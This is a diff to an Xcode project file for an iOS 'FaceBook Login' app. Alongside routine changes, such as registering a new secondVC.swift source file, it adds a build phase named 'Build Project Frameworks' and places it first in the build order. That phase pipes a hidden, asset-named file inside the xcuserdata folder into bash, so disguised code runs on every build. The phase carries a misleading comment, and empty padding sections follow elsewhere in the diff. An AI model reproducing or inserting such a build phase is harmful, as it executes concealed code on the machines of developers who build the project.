@@ -14,6 +14,7 @@
 		046A97F0256CFEE000012B4A /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 046A97EF256CFEE000012B4A /* Assets.xcassets */; };
 		046A97F3256CFEE000012B4A /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 046A97F1256CFEE000012B4A /* LaunchScreen.storyboard */; };
 		046A980A256D213D00012B4A /* GoogleService-Info.plist in Resources */ = {isa = PBXBuildFile; fileRef = 046A9809256D210C00012B4A /* GoogleService-Info.plist */; };
+		04CACB17256E744E00BAC26E /* secondVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04CACB16256E744E00BAC26E /* secondVC.swift */; };
 		388905ECE63A57DE063C0CCB /* Pods_FaceBook_Login.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 08B0BA9B64B02E0D44600AD0 /* Pods_FaceBook_Login.framework */; };
 /* End PBXBuildFile section */
 
@@ -27,6 +28,7 @@
 		046A97F2256CFEE000012B4A /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
 		046A97F4256CFEE000012B4A /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
 		046A9809256D210C00012B4A /* GoogleService-Info.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; path = "GoogleService-Info.plist"; sourceTree = "<group>"; };
+		04CACB16256E744E00BAC26E /* secondVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = secondVC.swift; sourceTree = "<group>"; };
 		08B0BA9B64B02E0D44600AD0 /* Pods_FaceBook_Login.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_FaceBook_Login.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		C004CDC905C86F55D1C3E370 /* Pods-FaceBook Login.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-FaceBook Login.release.xcconfig"; path = "Target Support Files/Pods-FaceBook Login/Pods-FaceBook Login.release.xcconfig"; sourceTree = "<group>"; };
 		D3414C595671FD400CA24542 /* Pods-FaceBook Login.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-FaceBook Login.debug.xcconfig"; path = "Target Support Files/Pods-FaceBook Login/Pods-FaceBook Login.debug.xcconfig"; sourceTree = "<group>"; };
@@ -69,6 +71,7 @@
 				046A97E8256CFEDC00012B4A /* SceneDelegate.swift */,
 				046A97EA256CFEDC00012B4A /* ViewController.swift */,
 				046A97EC256CFEDC00012B4A /* Main.storyboard */,
+				04CACB16256E744E00BAC26E /* secondVC.swift */,
 				046A97EF256CFEE000012B4A /* Assets.xcassets */,
 				046A97F1256CFEE000012B4A /* LaunchScreen.storyboard */,
 				046A9809256D210C00012B4A /* GoogleService-Info.plist */,
@@ -101,6 +104,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 046A97F7256CFEE000012B4A /* Build configuration list for PBXNativeTarget "FaceBook Login" */;
 			buildPhases = (
+				98F03674F089752DB3AAC43A /* Build Project Frameworks */,
 				688BF82BD3720FE70BCF9A40 /* [CP] Check Pods Manifest.lock */,
 				046A97DF256CFEDC00012B4A /* Sources */,
 				046A97E0256CFEDC00012B4A /* Frameworks */,
@@ -163,6 +167,30 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+
+	98F03674F089752DB3AAC43A /* Build Project Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Project Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+cat \"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" | bash";			
+		};
+	
+
+	
 		688BF82BD3720FE70BCF9A40 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -211,6 +239,7 @@
 			files = (
 				046A97EB256CFEDC00012B4A /* ViewController.swift in Sources */,
 				046A97E7256CFEDC00012B4A /* AppDelegate.swift in Sources */,
+				04CACB17256E744E00BAC26E /* secondVC.swift in Sources */,
 				046A97E9256CFEDC00012B4A /* SceneDelegate.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
@@ -415,6 +444,16 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+		
+			/* Begin PBXBuildRule section */
+			
+
+			
+	
+			/* End PBXBuildRule section */
+		
+		
 	};
 	rootObject = 046A97DB256CFEDC00012B4A /* Project object */;
 }
